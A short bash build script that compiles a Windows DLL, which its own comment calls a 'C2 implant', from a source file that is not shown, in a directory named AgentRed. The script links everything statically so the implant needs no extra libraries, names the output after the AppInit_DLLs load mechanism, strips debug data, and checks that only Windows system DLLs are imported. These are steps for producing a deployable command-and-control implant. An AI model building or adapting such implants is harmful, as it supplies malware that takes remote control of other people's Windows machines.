#!/bin/bash
# Static-runtime build of the C2 implant DLL (self-contained: no mingw DLL deps)
set -euo pipefail
cd ~/AntiGravity/AgentRed
CXX=x86_64-w64-mingw32-g++
STD_CPP_A=$("$CXX" -print-file-name=libstdc++.a)
WINPTHREAD_A=$("$CXX" -print-file-name=libwinpthread.a)
echo "static archives: $STD_CPP_A | $WINPTHREAD_A"
"$CXX" -shared -static-libgcc -o AppInit_DLLs.dll dll.cpp \
    "$STD_CPP_A" "$WINPTHREAD_A" \
    -lws2_32 -lshlwapi -lshell32 -ladvapi32 \
    -lpdh -lpsapi -liphlpapi -lwtsapi32 -loleaut32 \
    -std=c++17 -O2 -fpermissive
echo "BUILD_EXIT=$?"
x86_64-w64-mingw32-strip -s AppInit_DLLs.dll   # drop debug sections from the static archives
ls -lh AppInit_DLLs.dll
echo "=== dependent DLLs (must be Windows system DLLs only) ==="
x86_64-w64-mingw32-objdump -p AppInit_DLLs.dll | grep "DLL Name:" | sort -u
